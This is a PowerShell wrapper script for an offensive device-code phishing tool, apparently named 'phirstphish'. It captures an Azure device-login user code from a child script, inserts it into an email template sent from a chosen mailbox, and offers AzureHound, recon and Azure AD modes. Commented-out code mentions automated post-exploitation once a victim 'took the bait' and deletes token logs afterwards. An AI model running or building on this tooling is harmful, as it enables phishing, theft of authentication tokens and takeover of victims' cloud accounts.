[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Token,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$template,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$install = $false,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureHound = $false,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$recon = $false,   
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureAd = $false     
)

$banner = @"
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 ---------------------------+####+=----------------------------------------------------------------------------------- 
 -------------------------+%%%%%%%%#=--------------------------------------------------------------------------------- 
 ------------------------+%%%+--=#%%#--------------------------------------------------------------------------------- 
 ------------------------*%%#----+%%#=-------------------------------------------------------------------------------- 
 ------------------------=#%%#+=*%%%*--------------------------------------------------------------------------------- 
 -------------------------=#%%%%%%#+---------------------------------------------------------------------------------- 
 ----------------------------#%%#=------------------------------------------------------------------------------------ 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------*%%#------------------------------------------------------------------------------------- 
 ----------------------------+%%#------------------------------------------------------------------------------------- 
 ----------------------------+%%%=-----------------------#------------------------------------------------------------ 
 ----------------------------=%%%+----------------------+%------------------------------------------------------------ 
 -----------------------------%%%*---------------------=#%------------------------------------------------------------ 
 -----------------------------#%%#---------------------#%%------------------------------------------------------------ 
 -----------------------------=%%#=------------------=#%%#------------------------------------------------------------ 
 ------------------------------%%%*-----------------=#%%%*------------------------------------------------------------ 
 ------------------------------+%%#=----+##+-------=*+#%%+------------------------------------------------------------ 
 -------------------------------#%%#--=#%%%%%%#=-----+%%%------------------------------------------------------------- 
 -------------------------------=%%%*=*%%%%%%%%%%#=-=*%%+------------------------------------------------------------- 
 --------------------------------+%%%*-+%%%%%%%%%%%%#+---------------------------------------------------------------- 
 ---------------------------------+%%%#=-+*#%%%%%%%%%%%%*------------------------------------------------------------- 
 ----------------------------------=%%%%%*=---%%%%%%%%%%%%%#=--------------------------------------------------------- 
 --------------------------------=%+-+%%%%%*--+%%%%%%%%%%%%%%%+------------------------------------------------------- 
 -------------------------------+%%%#+-=#%#---*%%%%%%%%%%%%%%%#------------------------------------------------------- 
 ------------------------------+%%%%%%%#=----#%%%%%%%%%%%%%%%#-------------------------------------------------------- 
 -----------------------------*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%-+=------------------------------------------------------ 
 ----------------------------#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=-*%#+--------------------------------------------------- 
 ---------------------------#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*--+#%+------#%%#=---------------------------------- 
 --------------------------#%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%#=-+#%#+#%%%%%%%#=---------------------------------- 
 -------------------------#%%%%%%%%%%%%%%%%%%%%%%%+##%%%%%%%%%%%%%%%#=-=#%%%%%%%%%%%#+-------------------------------- 
 ------------------------#%%%%%%%%%%%%%%%%%%%%+%%%%%%%%%+%%%%%%%%%%%%%%%%%+--*%%%%%%%%%%%%*--------------------------- 
 ----------------------=#%%%%%%%%%%%%%%%%%%%%%#=-+%%%%%%%%%-=%%%%%%%%%%%%%%%%*--+%%%%%%%%%%%%#=----------------------- 
 ---------------------=#%%%%%%%%%%%%%%%%%%%%%%%%%#+++=#%*-*#%%%%%%%  %%%% %%%%%#=-+#%%%%%%%%%%%#=--------------------- 
 --------------------=#%%%%%%%%%%%%%#=-=#%%%%%%%%%%*-----------------------%%%%%#=-+#%%%%%%%%%%%#=--------------------
 -------------------=#%%%%%%%%%%%%%%%%%#+--*%%%%%%%*---------------------%%%%%#=-+#%%%%%%%%%%%%%%%%#=-----------------
 -------------------#%%%%%%%%%%%%%%%%%%%------------------------------------=------+#%%%%%%%%%%%%%%%%#----------------
 ------------------%%%%%%%%%%%%%%%%  _ -  | |__ (_)_ __ ___| |_ _  _ | |   (_)___| |__  %%%%%#=-+#%%%%%#--------------
 -----------------#%%%%%%%%%%%%%%%% | '_ \| '_ \| | '__/ __| __| '_ \| '_ \| / __| '_ \  %%%%%#=-+#%%%%#--------------
 ----------------%%%%%%%%%%%%%%%%%% | |_) | | | | | |  \__ \ |_| |_) | | | | \__ \ | | | %%%%%#=-+#%%%#---------------
 -----------------#%%%%%%%%%%%%%%%% | .__/|_| |_|_|_|  |___/\__| .__/|_| |_|_|___/_| |_| %%%%%#=-+#%%#----------------
 -------------------%%%%%%%%%%%%%%% |_|------------------------|_|----------------------%%%%%%*=-+%%#-----------------
 ---------------------=#%%%%%%%%%%%%%%%%%%%%%%#=-=----------------------------%%%%%#=-+#%%%%%%%%%%%#=-----------------
 ------------------------=#%%%%%%%%%%%%%%%%%%%%%%#=-----------------------%%%%%#=-+#%%%%%%%%%%%%%#=-------------------
 ---------------------------=*%%%%%%%%%%%%%%%%%%%%#=--+-*%%=--+%%%%%%#==-===%#-+%%%%%%%%%%%%%%%%#=--------------------
 -------------------------------+%%%%%%%%%%%%%%%%%%%%%*-#%=-%%##+#%%%%%%%#-+*-+%%%%%%%%%%%%%%%%%+---------------------
 ----------------------------------=#%%%%%%%%%%%%%%%%%%%%==##+=+=#%%%%%%%%%%+-=#%%%%%%%%%%%%%%%+----------------------
 -------------------------------------=#%%%%%%%%%%%%%%%%%%%#+*=-=#%%%%%%%%%%%%##%%%%%%%%%%%%%#+-----------------------
 ----------------------------------------=*%%%%%%%%%%%%%%%%%%%%*=%%%%%%%%%%%%%%%%%%%%%%%%%%%#=------------------------ 
 -------------------------------------------=+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#=------------------------- 
 -----------------------------------------------+#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=-------------------------- 
 --------------------------------------------------=#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=--------------------------- 
 -----------------------------------------------------=*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#----------------------------- 
 --------------------------------------------------------=+%%%%%%%%%%%%%%%%%%%%%%%%%%%%#------------------------------ 
 ------------------------------------------------------------+#%%%%%%%%%%%%%%%%%%%%%%%#------------------------------- 
 ---------------------------------------------------------------+#%%%%%%%%%%%%%%%%%%%#-------------------------------- 
 ------------------------------------------------------------------=*%%%%%%%%%%%%%%%*--------------------------------- 
 ---------------------------------------------------------------------=+%%%%%%%%%%%*---------------------------------- 
 ------------------------------------------------------------------------=+#%%%%%%+----------------------------------- 
 ----------------------------------------------------------------------------=*#*=------------------------------------ 
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
 %%%%%%%%%%%%%%%###%%############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
 %%%%%%%%%%%%%############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##############################%%% 
 %%%%#####################%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%############################%%%% 
 %%%%%%%%%%%%%%%%%%###############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
"@
Write-Host $banner

# Install and Import
# if($install = $true){
#     Write-Output "Installing modules"
#     .\Scripts\Install.ps1
# }
Write-Output "Importing modules"
.\Scripts\Import.ps1

# Start the separate script as a new process and redirect output to a file
if($azureHound -eq $true){ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 -azurehound" -RedirectStandardOutput "output.txt"}
if($recon -eq $true){ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 -recon" -RedirectStandardOutput "output.txt"}
if($azureAd -eq $true){ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 -azuread" -RedirectStandardOutput "output.txt"}   # -NoNewWindow
else{ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1" -RedirectStandardOutput "output.txt" }
# Wait for the file to have content 
Start-Sleep -Seconds 1

# Continuously check the output file for the user code
$userCode = $null
while ($null -eq $userCode -and -not $process.HasExited) {
    $output = Get-Content "output.txt" -Tail 10 # Read the last 10 lines of the output
    foreach ($line in $output) {
        if ($line -match "user_code\s*:\s*(\S+)") {
            $userCode = $matches[1]
            break
        }
    }
    Start-Sleep -Seconds 2
}

Write-Output "$userCode" | Out-File .\user_code.txt
# Output the user code
Write-Host "User Code: $userCode"

# Replace Values in Template

Write-Output "Sign in with your sender's account here. Template will be sent from this mailbox."
.\Next.ps1 -firstUser $firstUser -userCode $userCode -template $template


Read-Host "Keep Window Open"

# Send email to initial target











# Write-Output "Background process is polling endpoint for the authentication. If the user authenticates, automated post-exploitation will be performed inside that process."
# # Write-Output "Script will continue when process exits."

# $filePath = '.\switch.txt'
# # Poll for the existence of the file
# while (-not (Test-Path -Path $filePath)) {
#     Write-Output "Checking for switch.txt.."
#     Start-Sleep -Seconds 5 # Wait for 5 seconds before checking again
# }

# # Once the file exists, read its contents
# Write-Output "File exists!"
# $contents = Get-Content -Path $filePath

# # Display the contents
# Write-Output "$contents took the bait."

# $process.WaitForExit()
# $process | Stop-Process -Force -Confirm
# # Remove our switch file
# if(test-path .\switch.txt){ Remove-Item -force .\switch.txt } 

# # $process.Kill()

# Read-Host "Clean up and clear output?"
# # $processes = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 | ForEach-Object { $_.Kill() }
# if(test-path .\output.txt) { Remove-Item -force .\output.txt }
# if(test-path .\user_code.txt) { Remove-Item -force .\user_code.txt }
# if(test-path .\TokenLog.log) { Remove-Item -force .\TokenLog.log }
# if(test-path *.json) { Remove-Item -force *.json }

# $targetUser = ""
# $firstUser = ""
# $messageContent = "test"
# $subject = "Hey there"
# $template = "chatgpt"
# wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template

